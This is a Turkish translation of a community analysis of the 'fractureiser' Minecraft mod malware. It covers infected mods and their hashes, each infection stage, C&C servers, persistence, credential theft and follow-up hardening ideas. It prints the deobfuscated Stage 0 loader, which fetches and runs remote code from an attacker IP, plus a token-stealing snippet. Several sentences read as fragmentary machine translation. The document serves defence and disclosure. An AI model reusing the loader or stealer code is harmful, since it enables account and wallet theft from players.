# Teknik Bilgi

## Dağılım

Bazı mod paketlerinde, yazarların bilgisi olmadan güncellemeler yayınlanmış ve kötü amaçlı modlara bağımlılık eklenmiştir. Bu mod paketi güncellemeleri yüklendikten hemen sonra arşivlendi, yani *web kullanıcı arayüzünde görünmüyorlar, sadece API aracılığıyla gösteriliyorlar.*

Kötü niyetli modların yükleme tarihleri birkaç hafta öncesine dayanmaktadır. Bunların çoğu
açıkça otomatik olarak oluşturulmuş isimlere sahip tek kullanımlık hesaplar tarafından yüklenmiştir ve muhtemelen
enfeksiyonun. Luna Pixel Studios, bir geliştiricinin bunlardan birini test etmesi nedeniyle tehlikeye girdi
ilginç yeni bir yükleme olduğu için modlar.

### Bilinen etkilenen modlar ve eklentiler

Not: Bu liste **kapsamlı değildir**. Bu liste, Araştırmanın ilk günlerinde
soruşturma ve hızlı bir şekilde bunun kapsamının düşündüğümüzden çok daha büyük olduğunu fark ettik,
Bu da bireysel vakaların takibini anlamsız kılıyor. Tarihsel amaçlar için burada bırakılmıştır.

Ayrıca CurseForge'un
[liste](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
etkilenen projelerin sayısı

|mod/plugin|link(s)|SHA1|"Uploader"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (kaldırıldı)](https://dev.bukkit.org/projects/havenelytra/files/4551105) [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (kaldırıldı)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (kaldırıldı)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (kaldırıldı)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Entegrasyonları Hata düzeltmesi|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (kaldırıldı)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (kaldırıldı)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax bunu gönderdi: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

potansiyel olarak daha fazla: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Aşama 0 (Enfekte mod jar'ları)

Etkilenen mod veya eklentilerin ana sınıflarına yeni bir `static void` yöntemi eklenir ve bu yönteme yapılan bir çağrı sınıfın statik başlatıcısına eklenir. DungeonZ için yöntem `_d1385bd3c36f464882460aa4f0484c53` olarak adlandırılır ve `net.dungeonz.DungeonzMain` içinde bulunur. Skyblock Core için yöntem `_f7dba6a3a72049a78a308a774a847180` olarak adlandırılır ve `com.bmc.coremod.BMCSkyblockCore` içine eklenir. HavenElytra için kod doğrudan `valorless.havenelytra.HavenElytra` öğesinin başka şekilde kullanılmayan statik başlatıcısına eklenir.

Yöntemin kodu, dize değişmezleri yerine `new String(new byte[]{...})` kullanılarak gizlenmiştir.

D3SL "Create Infernal Expansion Plus" örneğinden, ana mod sınıfına kötü amaçlı yazılım eklenmiş "Create Infernal Expansion Compat "ın taklitçi bir sürümü:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Bu:
1. URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130)) ile bir `URLClassLoader` oluşturur
2. Classloader'dan `Utility` sınıfını yükler, internetten kod getirir
3. Her enfekte mod (!) için farklı bir String argümanı geçirerek `Utility` üzerindeki `run` yöntemini çağırır. Örneğin
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Kasa Entegrasyonları: "`-114.-18.38.108.-100`"

Aktarılan sayılar Aşama 1 tarafından bayt olarak ayrıştırılır ve ".ref" adlı bir dosyaya yazılır. Bunlar, yazarın enfeksiyon kaynaklarını izlemesinin bir yolu gibi görünmektedir.

Sınıf yükleyicinin oluşturulması bu URL'ye sabit kodlanmıştır ve Aşama 1'in yaptığı Cloudflare URL'sini kullanmaz. Bu IP şu anda çevrimdışı olduğundan, bu da *şu anda bildiğimiz* Aşama 0 yüklerinin artık çalışmadığı anlamına gelmektedir.

## Aşama 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Kötü Amaçlı Yazılımdan derlenmiş dosyalar burada bulunabilir](../decomp).

Utility.run`un yaptığı ilk şey `neko.run` sistem özelliğinin ayarlı olup olmadığını kontrol etmektir. Eğer öyleyse, *çalıştırmayı hemen durdurur*. Değilse, boş bir dizeye ayarlar ve devam eder. Bu, kötü amaçlı yazılımın kendisini birden fazla kez çalıştırmaktan kaçınmaya çalışması gibi görünmektedir, örneğin birden fazla mod'a bulaşmışsa. Stage1 internetten indirildiğinden ve değişebileceğinden *Bu bir öldürme anahtarı olarak güvenilemez.*

85.217.144.130` ve bir Cloudflare Pages alan adıyla (`https://files-8ie.pages.dev/ip`) iletişim kurmaya çalışıyor. Kötüye kullanım raporları zaten gönderilmiştir. Pages etki alanı, ilk IP artık yanıt vermiyorsa C&C sunucusunun IP'sini almak için kullanılır - URL, bir IPv4 adresinin ikili gösterimiyle yanıt verir.

*C&C IP'si, sunucu sağlayıcısına yapılan bir kötüye kullanım raporundan sonra iptal edildi. Yeni bir C&C sunucusunun kurulup kurulmadığını görmek için Cloudflare sayfasına göz kulak olmamız gerekecek, bunu planlamadıklarını düşünemiyorum * Hızlı yanıtınız için teşekkürler Serverion.

*Cloudflare Pages alanı sonlandırıldı. 107.189.3.101 adresinde yeni bir C&C sunucusu var.

1. Aşama daha sonra aşağıdakileri yaparak kalıcılığı sağlamaya çalışır:
1. Aşama 2'nin (Linux'ta lib.jar, Windows'ta libWebGL64.jar) sunucudan indirilmesi
2. Aşama 2'nin başlangıçta otomatik olarak çalışmasını sağlayın:
* Linux'ta, systemd birim dosyalarını `/etc/systemd/system` veya `~/.config/systemd/user` içine yerleştirmeyi dener.
    * Kullanıcı klasörüne yerleştirdiği birim dosyası asla çalışmaz, çünkü kullanıcı birimleri için mevcut olmayan `multi-user.target` dosyasını kullanmaya çalışır
* Windows'ta kayıt defterini değiştirmeye çalışır
  (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) kendisini başlatmak için veya
  Bunu başaramazsa, kendisini `Windows\Start Menu\Programs\Startup` klasörüne eklemeyi dener

## Aşama 2 (`lib.jar` veya `libWebGL64.jar`)

Known sha1 hashes:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL's earlier upload)

Aşama 2, Allatori obfuscator'ın demo sürümü ile gizlenmiştir ve ana sınıfı `Bootstrap` olarak adlandırılmıştır.
Ek olarak, basit bir iletişim sınıfı gibi görünen, ancak boş olan `h` adlı başka bir sınıf içerir
Aksi takdirde. Kaynak kodunu yeniden oluşturma girişimini şu adresten görüntüleyebilirsiniz
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

Başlatıldığında aşağıdakileri yapar:
1. 9655` portunu açın ve jvm kapandığında kapatmak için bir kapatma kancası ekleyin.
2. Kendini disk üzerinde bulur ve kendi yanında çalışır
3. Eğer `.ref' varsa, tanımlayıcı anahtarı dosyadan okur
4. Şunlar için bir döngü başlatır
    1. Sunucu için `https://[files-8ie.pages.dev]:8083/ip` ile kontrol eder ve ona bağlanmaya çalışır
    2. Güncelleme kontrolünün devam edip etmeyeceğine dair bir bayrak alır, devam etmeyecekse atar (`1338` portundaki sunucuya bildirilir)
    3. Eğer öyleyse, bir hash alır ve varsa `client.jar` ile karşılaştırır, güncellemek istiyorsa bir bayt geri gönderir
    4. Eğer öyleyse, `client.jar` dosyasını alır ve üzerine yazar/yaratır, dosya özniteliklerini kullanarak gizler
    5. Dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` statik yöntemini yükler ve çağırır.
    6. 5 saniye boyunca uyur

## Aşama 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

client.jar` inanılmaz derecede karmaşık ve karmaşık bir kod paketidir ve hem java hem de yerel kod içerir.

Derlenmiş yerel bir `hook.dll` yükü içerir: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

JNI tarafından çağrılabilir oldukları için Java'dan çağrılmaları amaçlanan iki yerel işlev vardır:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Analizlere göre, bunlar üzerinde ne yazıyorsa onu yapıyor:
* Pano içeriğini okur
* Microsoft hesap kimlik bilgilerini çalma

Ayrıca aşağıdakileri yapmaya çalışan kodun kanıtı da var:
* Sistemde Minecraft modlarına benzeyen *tüm* jar dosyalarını tarayın (Minecraft modlarını tespit ederek
  Forge/Fabric/Quilt/Bukkit) veya [bir main
  class](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (çoğu düz Java programı) ve bunlara Stage 0 enjekte etmeye çalışın
* Birçok web tarayıcısı için çerezleri ve giriş bilgilerini çalmak
* Panodaki kripto para adreslerini saldırganın sahip olduğu tahmin edilen alternatiflerle değiştirin
* Discord kimlik bilgilerini çalın
* Çeşitli başlatıcılardan Microsoft ve Minecraft kimlik bilgilerini çalın
* Kripto cüzdanlarını çalmak

Jar'lar sezgisel olarak Minecraft modları veya eklentileri olarak aşağıdaki şekilde algılanır:
* Forge (`dev/neko/e/e/A`): Kötü amaçlı yazılım, her modda gerekli olan `@Mod` ek açıklamasını bulmaya çalışır
* Bukkit (`dev/neko/e/e/C`): Kötü amaçlı yazılım, bir sınıfın Bukkit'in `JavaPlugin` sınıfını genişletip genişletmediğini kontrol eder
* Fabric/Quilt (`dev/neko/e/e/i`): Kötü amaçlı yazılım, bir sınıfın `ModInitializer` uygulayıp uygulamadığını kontrol eder
* Bungee (`dev/neko/e/e/l`): Kötü amaçlı yazılım, bir sınıfın Bungee'nin `Plugin` sınıfını genişletip genişletmediğini kontrol eder
* Vanilla (`dev/neko/e/e/c`): Kötü amaçlı yazılım `net.minecraft.client.main.Main` ana istemci sınıfının var olup olmadığını kontrol eder

## Aşama 3 (`unobf-client.jar`)

2023-06-07 14:20 UTC civarında stage3 istemci kavanozu görünüşe göre yanlışlıkla gizlenmemiş bir sürümle değiştirildi. Arşivi burada bulabilirsiniz: https://github.com/clrxbl/NekoClient

Bu, önceki gizlenmiş `client.jar` örneği üzerinde yapılan analizden şüphelenilen davranışı/kanıtı doğrular.

### Çoğaltma

Çoğaltma, yerel makinedeki tüm dosya sistemi boyunca jar dosyalarındaki sınıfların otomatik olarak işlenmesi yoluyla gerçekleştirilir. Belirli kriterleri karşılayan sınıflar içeren herhangi bir jar dosyası bulaşmaya tabidir. Yerel dosya sistemini tarama ve kötü amaçlı kod enjekte etme işlemi burada bulunabilir: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

Sürecin aradığı kriterleri burada bulabilirsiniz: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` sınıflarda `net/md_5/bungee/api/plugin/Plugin` arayüzünü arar
* `FabricModTemplate` sınıflarda `net/fabricmc/api/ModInitializer` arayüzünü arar
* `ForgeModTemplate` sınıflarda `net/minecraftforge/fml/common/Mod` ek açıklamasını arar
* `MinecraftClientTemplate`, kavanozda `net/minecraft/client/main/Main.class` ve `net/minecraft/client/gui/GuiMultiplayer.class` dosyalarının varlığını arar 
* `SpigotPluginTemplate` sınıflarda süper tip `org/bukkit/plugin/java/JavaPlugin` arar
* Yukarıdakilerden hiçbiri sınıfla eşleşmezse, [jar dosyasının ana sınıfına bulaştırmaya çalışır](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - eğer varsa.

Enjekte edilen kötü amaçlı kod, Aşama0'da görülen arka kapı mantığıdır. Enjeksiyonun çalışma şekli, kötü amaçlı kodun `Loader` sınıfında statik bir yöntemle bildirilmesidir. Ona bitişik olan `Injector` sınıfı, kodu `Loader`dan çıkarmak ve bulaşma için hedeflenen yeni sınıflara eklemekten sorumludur. Enjektör.loadInstallerNode(...)`un geri dönüş değeri, bulaştırma işleminin kendisini özetleyen bir `MetodNode`dur. Şimdi tek yapmaları gereken bu yöntemi hedeflenen sınıfa eklemektir. Bunu başarmak için [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) içinde `Entry.inject(MethodNode)` çağırıyorlar. Kötü amaçlı yöntemin çağrılmasını sağlamak için bu `inject` yöntemi, hedeflenen sınıfın statik başlatıcısına eklenen yöntemi çağıran mantık ekler. Statik başlatıcı sınıf ilk yüklendiğinde çalıştırıldığından ve hedef sınıf bir eklenti/mod olduğundan, bu kodun virüslü mod paketlerini veya sunucuları çalıştıran kullanıcılar tarafından her zaman tetikleneceği varsayılır. Bundan sonra, jar'ı yeni bulaşmış hedef sınıfla yeniden paketlerler.

### Anti-Sandbox hileleri

JVM kötü amaçlı yazılımlarında yaygın olarak görülmeyen bir şey burada mevcut olan `VMEscape` başlıklı bir sınıftır. Geçerli kullanıcının `WDAGUtilityAccount` olup olmadığını kontrol ederek [Windows Sandbox] (https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) içinde olup olmadığını kontrol eder. Bu koşul yerine getirilirse, Windows Sandbox'tan kaçmaya çalışılır.

İşlem kabaca aşağıdaki gibidir:

- Aşağıdaki eylemleri çalıştırmak için yinelenen bir iş parçacığı başlatın:
  - Files.createTempDirectory(...)` kullanarak geçici bir dizin oluşturun
  - Ana bilgisayar panosunu yansıtan sistem panosundaki `FileDescriptor` girdileri üzerinde yineleme 
  - Orijinal dosyaya benzeyen _(SHELL32'deki simgeleri kullanarak)_ ancak bunun yerine kötü amaçlı yazılımı çağıran bir kısayol oluşturun
  - Bu kısayolu, orijinal dosya referansının üzerine yazarak panoya atar

Böylece, bir kullanıcı bir dosyayı kopyalar ve başka bir yere yapıştırmaya giderse, bunun yerine amaçladıkları dosya gibi görünen ancak aslında kötü amaçlı yazılımı çalıştıran bir kısayol yapıştıracaktır.

### Veri hırsızlığı

**MSA Jetonları**: Bu mod Minecraft modlarını hedef aldığından, Minecraft'a giriş yapmak için kullanılan MSA belirtecini çalmaya çalışması doğaldır. Bazı başlatıcılar bu verileri, bu kötü amaçlı yazılımın okumaya çalışacağı yerel bir dosyada tutar. Bu, aşağıdakiler gibi çeşitli başlatıcıları etkiler:

* Vanilla/mojang başlatıcısı
* Eski vanilya/mojang başlatıcı
* PolyMC / Prizma
* Technic
* Feather
* LabyMod (< v3.9.59)
* Ve [Windows Credential Manager]'da (https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0) bulunan herhangi bir MSA belirteci

Retrival mantığı ([`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) bu verileri benzer bir şekilde sakladıkları için bir dizi öğede benzer görünüyor. Örneğin burada laby-mod kodu bulunmaktadır:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
Feather/PolyMC/Prism'den token almak için kullanılan kod esasen aynıdır.

Bu stratejiden vanilya başlatıcılara olan değişiklik, Json'un onu koruyan ek bir kriptografi katmanına sahip olmasıdır.

Bu stratejiden technic'e olan değişiklik, technic'in kimlik bilgilerini Java'nın yerleşik nesne serileştirmesini kullanarak saklaması ve `com.google.api.client.auth.oauth2.StoredCredential` türünü sarmasıdır.

**Discord belirteçleri**: Herkes daha önce bir token hırsızı görmüştür. Standart istemci, canary, ptb ve lightcord istemcilerini etkiler.

**Çerezler ve Kaydedilmiş kimlik bilgileri**: Etkilenen tarayıcılarda kayıtlı çerezleri ve oturum açma kimlik bilgilerini çalar.  İlgili kaynak: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Aşama 3b (`dummyloader3.jar`)

Aşama 3, ikinci C&C sunucusu kurulduktan bir süre sonra başka bir kavanozla değiştirildi.

Blackspigot'u hedef alan başka bir minecraft kötü amaçlı yazılımı olan SkyRage güncelleyicisi gibi görünüyor.

### Kalıcılık
- Windows: görev zamanlayıcı `MicrosoftEdgeUpdateTaskMachineVM`, dosya `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, service `vmd-gnu`

### Bağlantılar
- C&C sunucusu: `connect.skyrage.de`
- İndiriliyor: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqq`

### Eylemler
- `qqqqqqqqqq` kavanozu her türlü bilgiyi (tarayıcı çerezleri, discord, minecraft, epic oyunları, steam girişi, ayrıca kripto cüzdanları ve şifre pamangers hakkında bazı şeyler) çıkarır ve bu güncelleme kavanozu C&C sunucusuna yükler
- panodaki kripto para adreslerini `95.214.27.172:18734` adresinden alınan adresle değiştirir
- kalıcılık (yukarıya bakın)
- otomatik güncelleyici içerir, geçerli sürüm 932'dir (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Eşlemeler

Bunlar, Enigma veya Engima eşlemelerini destekleyen başka bir araç aracılığıyla uygulanabilen bu örnek için eşlemelerdir.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Anti-decompilation

Bu örnek, çözümleyici araçlarını çökertmek için sınıf dosyasındaki teknik özellikleri kötüye kullanıyor gibi görünmektedir. Bu tür istismarlar, hatalı biçimlendirilmiş öznitelikleri filtreleyen bir bayt kodu ayrıştırıcısı olan [CAFED00D](https://github.com/Col-E/CAFED00D) kullanılarak düzeltilebilir. Bundan sonra, geriye kalan tek güçlük Allatori demosu tarafından uygulanan temel şaşırtmadır.

# Diğer Şeyler

Canlı 3. aşama tersine çevirme dokümanında daha fazla ayrıntı mevcuttur: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

İkinci C&C sunucusu ayağa kaldırıldığında, 3. aşamanın deobfuscated bir versiyonu
yanlışlıkla yaklaşık 40 dakika boyunca hizmet verdi.

Ana yük sunucusu Hollanda merkezli bir şirket olan Serverion'da barındırılıyordu (kaldırıldı).

Yeni C&C de kapatıldı. 2023-06-07 18:51 UTC_

80/443 bağlantı noktasındaki HTTP sunucusu ve 22 bağlantı noktasındaki SSH sunucusu dışında, `85.217.144.130` ve `107.189.3.101` üzerinde aşağıdaki bağlantı noktaları açıktı:

* 1337
* 1338 (yeni Hata Ayıklayıcı bağlantısı oluşturmak için Aşama 1'in dosyasında başvurulan bir bağlantı noktası)
* 8081 (bu bir WebSocket sunucusudur - şu anda görünürde bir işlevi yoktur, herhangi bir kötü amaçlı kodda referans gösterilmez)
* 8082 (kimse bundan bir şey elde etmedi, herhangi bir kötü amaçlı kodda referans verilmedi)
* 8083 (1. Aşama tarafından iletişime geçildi)

Curiously, fractureiser's bukkit page says "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/

## Örnekler

Örneklere okuma veya okuma/yazma erişimi için lütfen IRC sohbetinde sorun. Derlenmiş Aşama 3 istemcisinin kaynak kodu mevcuttur: https://github.com/clrxbl/NekoClient

## Takipler
Uzun vadeli takiplerden bahsetmek için biraz erken olsa da, tüm bu fiyasko, modlanmış Minecraft ekosistemindeki birkaç kritik kusuru ortaya çıkardı. Bu bölüm sadece onlar ve nasıl geliştirebileceğimiz üzerine beyin fırtınası yapmak içindir.

#### 1. Mod depolarındaki inceleme yetersiz

CurseForge ve Modrinth bir modu "gözden geçirirken" tam olarak ne yapıyor? Belirsizlik yoluyla güvenliğe güvenmek yerine, topluluk olarak bilmeliyiz.
Bir çeşit statik analiz yapıyor olmalı mıyız? (williewillus'un burada birkaç fikri var)

#### 2. Modlar için kod imzalama eksikliği

Genel olarak yazılım endüstrisinin aksine, yayınlanan ve depolara yüklenen modlar genellikle anahtarın sahibinin modu yüklediğini kanıtlayan bir imzalama anahtarı ile imzalanmaz. İmzalama ve ayrı bir anahtar dağıtım/güven mekanizmasına sahip olmak CurseForge hesaplarının ele geçirilmesini azaltır.

Bununla birlikte, bu daha sonra anahtar güveninin nasıl elde edileceğine dair daha büyük bir soruna yol açar, çünkü "bu kavanozun bu imzaya sahip olduğu" gerçeği, yükleyicilerin veya kullanıcıların imzaları doğrulayabilmesi için standart bir şekilde CurseForge/Modrinth'ten banttan iletilmelidir.
Forge yıllar önce imzalamayı tanıtmaya çalıştı ve sınırlı bir kabul gördü.

#### 3. Yeniden üretilebilir yapıların eksikliği

Minecraft araç zincirleri karmakarışıktır ve derlemeler genellikle tekrarlanabilir değildir. Yapı betiklerinin rastgele Gradle eklentilerinin sabitlenmemiş -SNAPSHOT sürümlerini getirmesi ve bunları kullanması yaygındır, bu da yeniden üretilemeyen ve dolayısıyla denetlenemeyen yapılara neden olur.

Rastgele bir Gradle eklentisinin gelecekte bir saldırı vektörü olması söz konusu değildir.

#### 4. Minecraft'ın kendisinin sandbox olmaması

Java sürümü modlama her zaman Java'nın tüm gücüne sahip olmuştur ve bu iki ucu keskin kılıcın diğer tarafıdır: kötü amaçlı kodun geniş kapsamlı etkisi vardır.
Minecraft'ın kendisi herhangi bir sandbox ile çalıştırılmaz ve sunucu sahibi bunu yapacak kadar bilgili değilse sunucular genellikle sandbox'lanmaz.

Özellikle Linux gibi SELinux/AppArmor'un çok kötü bir kullanıcı deneyimine sahip olduğu ve kimsenin kullanmadığı sistemlerde iyi bir kum havuzu oluşturmak zordur.
